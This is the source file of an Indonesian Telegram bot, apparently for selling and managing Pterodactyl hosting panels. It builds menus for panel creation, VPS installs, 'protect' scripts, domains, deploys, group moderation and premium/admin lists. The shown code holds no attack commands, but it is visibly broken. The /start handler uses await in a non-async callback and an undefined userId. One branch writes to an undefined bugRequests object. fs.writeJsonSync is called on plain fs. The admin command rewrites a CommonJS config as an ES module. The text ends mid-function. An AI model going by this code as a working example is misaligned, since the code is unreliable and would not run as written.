const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2'); 
const { execSync } = require('child_process');
const { owner, OWNER_IDS, ownerName, botName, BOT_TOKEN, photoURL, ADMIN_IDS, CHANNEL_ID, ApikeyAtlantic, FeeTransaksi } = require('./setting');
const path = require("path");
const axios = require("axios");
const qs = require("qs");
const QRCode = require("qrcode");
const FormData = require("form-data");
const moment = require("moment-timezone");
const fsExtra = require("fs-extra");
const fs = require('fs');
const setting = require('./setting.js');
const apiAtlantic = setting.ApikeyAtlantic;
const FeeTrx = setting.FeeTransaksi;
const nopencairan = setting.nomor_pencairan;
const typeewallet = setting.type_ewallet;
const atasnamaewallet = setting.atas_nama_ewallet;
const { addSaldo, minSaldo, cekSaldo, listSaldo, resetSaldo } = require('./source/deposit');
let db_saldo = JSON.parse(fsExtra.readFileSync('./source/saldo.json'));
const sviddepo = path.join(__dirname, 'sviddepo.json');
const userPendingTopup = {};
const activeDeposit = {};
const Tokeninstall = setting.tokeninstall;
const Bash = setting.bash;
const premiumUsersFile = 'premiumUsers.json';
const domain = setting.domain;
const plta = setting.plta;
const pltc = setting.pltc;
const githubUser = setting.githubUser;
const githubToken = setting.githubToken;
const tokenVercel = setting.vercel;
const tokenNetlify = setting.netlify;

try {
    premiumUsers = JSON.parse(fsExtra.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
    
// Cooldown system
const COOLDOWN_TIME = 20000; 
const cooldown = new Map();

function checkCooldown(userId) {
    const now = Date.now();
    if (cooldown.has(userId)) {
        const expirationTime = cooldown.get(userId);
        if (now < expirationTime) {
            const remainingTime = Math.ceil((expirationTime - now) / 1000);
            return remainingTime;
        }
    }
    cooldown.set(userId, now + COOLDOWN_TIME);
    return 0;
}

function resetCooldown(userId) {
    cooldown.delete(userId);
}
    
function getAllowedGroups() {
  if (!fs.existsSync(sviddepo)) return [];
  try {
    return JSON.parse(fs.readFileSync(sviddepo));
  } catch {
    return [];
  }
}
    
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
    
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
    
// Retry mechanism untuk handle Telegram API errors
async function withRetry(operation, maxRetries = 3, delay = 1000) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            return await operation();
        } catch (error) {
            if (attempt === maxRetries) throw error;
            
            // Hanya retry untuk error tertentu
            if (error.message?.includes('ETELEGRAM') || 
                error.message?.includes('timeout') ||
                error.message?.includes('query is too old') ||
                error.code === 'ECONNRESET') {
                console.log(`🔄 Retry attempt ${attempt} for Telegram API`);
                await new Promise(resolve => setTimeout(resolve, delay * attempt));
                continue;
            }
            throw error;
        }
    }
}
    
// Timeout wrapper untuk fetch
async function fetchWithTimeout(url, options = {}, timeout = 15000) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response;
    } catch (error) {
        clearTimeout(timeoutId);
        throw error;
    }
}
    
// Membership functions - OPTIMIZED
async function isMember(userId) {
    try {
        if (!setting.CHANNEL_ID) {
            console.log("⚠️ CHANNEL_ID not set in setting");
            return true;
    }
            
    console.log(`🔍 Checking membership for ${userId} in ${setting.CHANNEL_ID}`);
            
    const member = await withRetry(() => 
         bot.getChatMember(setting.CHANNEL_ID, userId)
        );
            
    console.log(`📊 Member status: ${member.status}`);
            
    const isMember = ['member', 'administrator', 'creator'].includes(member.status);
    console.log(`✅ Is member: ${isMember}`);
            
    return isMember;
            
} catch (error) {
    console.error('❌ Error checking membership:', error.message);
            
// Return true untuk error tertentu agar user tetap bisa pakai bot
    if (error.response?.body?.error_code === 400 || 
       error.message?.includes('chat not found')) {
       console.log('🔄 Membership check failed, allowing access');
       return true;
       }
            
     return false;
   }
}
    
async function sendJoinChannel(chatId) {
try {
    let channelId = setting.CHANNEL_ID;
    if (channelId.startsWith('@')) {
        channelId = channelId.substring(1);
    }
            
    const message = `📢 *JOIN CHANNEL REQUIRED*\n\nUntuk menggunakan fitur Bot, kamu harus join channel terlebih dahulu Untuk Mendapatkan Akses Bot:\n\nhttps://t.me/aboutyamzz`;
            
    await withRetry(() => 
        bot.sendMessage(chatId, message, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Join Channel", url: `https://t.me/aboutyamzz` }],
                    [{ text: "Sudah Join", callback_data: "check_join" }]
                 ]
             }
         })
     );
} catch (error) {
    console.error('Error sending join message:', error);
  }
}
    
function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}
    
const dataDir = path.join(__dirname, 'data');
const dataFiles = ['users.json'];
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);
for (const f of dataFiles) {
  const filePath = path.join(dataDir, f);
  if (!fs.existsSync(filePath)) fs.writeJsonSync(filePath, []);
  else if (fs.readFileSync(filePath, 'utf8').trim() === '') fs.writeJsonSync(filePath, []);
}

  // ─── /start ───────────────────────────────
  bot.onText(/^\/start$/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    
// ✅ CHECK MEMBERSHIP FIRST
        const joined = await isMember(userId);
        if (!joined) {
            await sendJoinChannel(chatId);
            return;
        }
        
    const welcomeCaption = `
ʜᴀʟᴏ ${sender}, sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ *${botName}*! 👋
ᴏᴡɴᴇʀ ʙᴏᴛ ɪɴɪ ᴀᴅᴀʟᴀʜ *${ownerName}*.
ɢᴜɴᴀᴋᴀɴ /menu ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀғᴛᴀʀ ᴘᴇʀɪɴᴛᴀʜ.
`;

    bot.sendPhoto(chatId, photoURL, {
      caption: welcomeCaption,
      parse_mode: 'Markdown'
    });
  });

// ─── /menu ───────────────────────────────
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
    caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

Pilih menu yang tersedia di bawah: 👇`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "👥 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖", callback_data: "grubmenu" }, 
       { text: "🌎 𝑫𝒆𝒑𝒍𝒐𝒚 𝑴𝒆𝒏𝒖", callback_data: "deploymenu" }],
        [{ text: "🛡️ 𝑷𝒓𝒐𝒕𝒆𝒄𝒕 𝑴𝒆𝒏𝒖", callback_data: "protectmenu" }, 
       { text: "🔧 𝑼𝒏𝑷𝒓𝒐𝒕𝒆𝒄𝒕 𝑴𝒆𝒏𝒖", callback_data: "unprotectmenu" }],
      [{ text: "🚀 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖", callback_data: "panelmenu" },
     { text: "⚡ 𝑫𝒐𝒎𝒂𝒊𝒏 𝑴𝒆𝒏𝒖", callback_data: "domainmenu" }],
       [{ text: "💫 𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖", callback_data: "installmenu" },
      { text: "💥 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖", callback_data: "fiturmenu" }],
        [{ text: "👑 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖", callback_data: "ownermenu" },
       { text: "👥 𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐", callback_data: "thanksto" }],
     [{ text: "🛒 𝑶𝒓𝒅𝒆𝒓 𝑶𝒕𝒐𝒎𝒂𝒕𝒊𝒔", callback_data: "buyotomatis" }]
      ]
    }
  });
});



bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const data = query.data;
  const senderId = query.from.id;
  
  if (data === "menu") {
    bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

Pilih menu yang tersedia di bawah: 👇`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "👥 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖", callback_data: "grubmenu" }, 
       { text: "🌎 𝑫𝒆𝒑𝒍𝒐𝒚 𝑴𝒆𝒏𝒖", callback_data: "deploymenu" }],
        [{ text: "🛡️ 𝑷𝒓𝒐𝒕𝒆𝒄𝒕 𝑴𝒆𝒏𝒖", callback_data: "protectmenu" }, 
       { text: "🔧 𝑼𝒏𝑷𝒓𝒐𝒕𝒆𝒄𝒕 𝑴𝒆𝒏𝒖", callback_data: "unprotectmenu" }],
      [{ text: "🚀 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖", callback_data: "panelmenu" },
     { text: "⚡ 𝑫𝒐𝒎𝒂𝒊𝒏 𝑴𝒆𝒏𝒖", callback_data: "domainmenu" }],
       [{ text: "💫 𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖", callback_data: "installmenu" },
      { text: "💥 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖", callback_data: "fiturmenu" }],
        [{ text: "👑 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖", callback_data: "ownermenu" },
       { text: "👥 𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐", callback_data: "thanksto" }],
     [{ text: "🛒 𝑶𝒓𝒅𝒆𝒓 𝑶𝒕𝒐𝒎𝒂𝒕𝒊𝒔", callback_data: "buyotomatis" }]
      ]
    }
  });
  
  } else if (data === "protectmenu") {
    bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", {
    caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━[ 𝗠𝗘𝗡𝗨 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 ]
┃ ϟ /installprotect1
┃ ϟ /installprotect2
┃ ϟ /installprotect3
┃ ϟ /installprotect4
┃ ϟ /installprotect5
┃ ϟ /installprotect6
┃ ϟ /installprotect7
┃ ϟ /installprotect8
┃ ϟ /installprotect9
┃ ϟ /installprotectall
╰━━━━━━━━━━━━━━━━━━━━━━
`,
    parse_mode: "Markdown",
    reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
    }
});

  } else if (data === "unprotectmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗠𝗘𝗡𝗨 𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 ⟯ 
┃▢ /uninstallprotect1
┃▢ /uninstallprotect2
┃▢ /uninstallprotect3
┃▢ /uninstallprotect4
┃▢ /uninstallprotect5
┃▢ /uninstallprotect6
┃▢ /uninstallprotect7
┃▢ /uninstallprotect8
┃▢ /uninstallprotect9
┃▢ /uninstallprotectall
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "installmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗠𝗘𝗡𝗨 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗔𝗡𝗘𝗟 ⟯ 
┃▢ /installpanel1 versi 20.04
┃▢ /installpanel2 versi 22.04 / 24.04
┃▢ /installwings
┃▢ /resetpwvps
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "grubmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝙋𝙍𝙊𝙏𝙀𝘾𝙏 𝘽𝙔 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗠𝗘𝗡𝗨 𝙂𝙍𝙊𝙐𝙋 ⟯ 
┃▢ /mute
┃▢ /unmute
┃▢ /promote
┃▢ /demote
┃▢ /tagall
┃▢ /ban
┃▢ /kick
┃▢ /welcome on/off
┃▢ /setwelcome
┃▢ /filter
┃▢ GAK TAU MAU NAMBAH APALAGI 🗿
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "deploymenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝙈𝙀𝙉𝙐 𝘿𝙀𝙋𝙇𝙊𝙔 ⟯ 
┃▢ /deployvercel
┃▢ /deploynetlify
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "panelmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗠𝗘𝗡𝗨 𝗣𝗔𝗡𝗘𝗟 𝗣𝗧𝗘𝗥𝗢𝗗𝗔𝗖𝗧𝗬𝗟 ⟯ 
┃▢ /1gb user,idtele
┃▢ /2gb user,idtele
┃▢ /3gb user,idtele
┃▢ /4gb user,idtele
┃▢ /5gb user,idtele
┃▢ /6gb user,idtele
┃▢ /7gb user,idtele
┃▢ /8gb user,idtele
┃▢ /9gb user,idtele
┃▢ /10gb user,idtele
┃▢ /unli user,idtele
┃▢ /listuser
┃▢ /listserver
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "domainmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗟𝗜𝗦𝗧 𝗔𝗟𝗟 𝗗𝗢𝗠𝗔𝗜𝗡 ⟯ 
┃▢ yamzzoffc.my.id
┃▢ sainsproject.biz.id
┃▢ barmodsdomain.my.id
┃▢ publicserver.my.id
┃▢ rikionline.shop
┃▢ storeid.my.id
╰━━━━━━━━━━━━━━━━━━
╭━━━━⟮ 𝗖𝗔𝗥𝗔 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗔𝗡 ⟯ 
┃▢ /domain1 hostname|ipvps
┃▢ /domain2 hostname|ipvps
┃▢ /domain3 hostname|ipvps
┃▢ /domain4 hostname|ipvps
┃▢ /domain5 hostname|ipvps
┃▢ /domain6 hostname|ipvps
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "fiturmenu") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝙈𝙀𝙉𝙐 𝙏𝙊𝙊𝙇𝙎 ⟯ 
┃▢ /cekid
┃▢ /brat
┃▢ /iqc
┃▢ /tourl
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

bugRequests[chatId] = { stage: "awaitingNumber" }; 
  } else if (data === "ownermenu") {
    bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 ⟯ 
┃▢ /addprem 
┃▢ /delprem
┃▢ /addadmin
┃▢ /deladmin
┃▢ /listadmin
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });
    
  } else if (data === "thanksto") {
    bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
╭━━━━⟮ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ⟯ 
┃▢ @yamzzzx [ Developer ]
┃▢ @malz [ Support ]
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "buyotomatis") {
 bot.sendPhoto(chatId, "https://i.ibb.co/fTywFQR/20251107-022237.jpg", { 
      caption: `
┏━━━[ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗕𝗬 𝙔𝘼𝙈𝙕𝙕 ]━━━━━❍
┃ ϟ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @yamzzzx
┃ ϟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ : @aboutyamzz
┃ ϟ ᴠᴇʀsɪ : 4.0
┃ ϟ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀsᴄʀɪᴘᴛ
┗━━━━━━━━━━━━━━━━❍

╭━━━━⟮ 𝗕𝗨𝗬 𝗢𝗧𝗢𝗠𝗔𝗧𝗜𝗦 ⟯ 
┃▢ /buypanel
┃▢ /buyresellerpanel
╰━━━━━━━━━━━━━━━━━━`,
      reply_markup: {
        inline_keyboard: [
            [{ text: "📞 𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/yamzzzx" },
            { text: "📌 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", url: "https://t.me/aboutyamzz" }],
            [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu" }]
        ]
      }
    });

  } else if (data === "batalbuy") {
    if (activeDeposit[userId]) {
      clearTimeout(activeDeposit[userId].timeout);
      bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });
      delete activeDeposit[userId];
      bot.answerCallbackQuery(query.id, { text: "✅ Pembelian dibatalkan." });
      bot.sendMessage(chatId, "❌ Pembelian berhasil dibatalkan.");
    } else {
      bot.answerCallbackQuery(query.id, { text: "Tidak ada transaksi aktif." });
    }
  }

  bot.answerCallbackQuery(query.id);
});

  // ─── /fiturpremium ───────────────────────
  bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!premiumUsers.includes(userId)) {
            premiumUsers.push(userId);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});
  
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = premiumUsers.indexOf(userId);
        if (index !== -1) {
            premiumUsers.splice(index, 1);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});
  
  bot.onText(/^\/fiturpremium$/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!premiumUsers.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Kamu bukan user premium!');
    }

    bot.sendMessage(chatId, '✨ Selamat datang di fitur *Premium Eksklusif*!', { parse_mode: 'Markdown' });
  });

bot.onText(/\/addadmin (\d+)/, async (msg, match) => {
  const senderId = msg.from.id;
  const newAdminId = Number(match[1]);

  if (!setting.ADMIN_IDS.includes(senderId))
    return bot.sendMessage(senderId, "❌ Kamu tidak punya izin menambah admin.");

  if (setting.ADMIN_IDS.includes(newAdminId))
    return bot.sendMessage(senderId, "⚠️ User ini sudah menjadi admin.");

  setting.ADMIN_IDS.push(newAdminId);

  // Simpan ke settingjs
  const configPath = path.join(__dirname, "setting.js");
  const updatedConfig = `export default ${JSON.stringify(setting, null, 2)};\n`;
  fs.writeFileSync(configPath, updatedConfig, "utf8");

